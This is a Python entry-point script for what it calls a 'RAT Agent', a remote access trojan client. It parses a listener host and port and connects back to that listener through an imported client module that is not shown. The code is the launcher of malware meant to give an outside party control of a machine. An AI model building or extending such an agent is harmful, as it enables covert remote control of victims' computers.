import argparse
import client.utils.client as client
from src.client.utils.config import logger

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="RAT Agent Version 0.1.0"
    )

    parser.add_argument(
        "listener_host",
        help="Listener IP address"
    )
    parser.add_argument(
        "listener_port",
        type=int,
        help="Listener port"
    )

    return parser.parse_args()


def main() -> None:
    args = parse_args()
    client_handler = client.AgentClient(args.listener_host, args.listener_port)

    # Connect to server listener
    try:
        client_handler.connect()
        client_handler.run()
    except KeyboardInterrupt:
        logger.debug("CTRL+C pressed, shutting down agent...")

if __name__ == "__main__":
    main()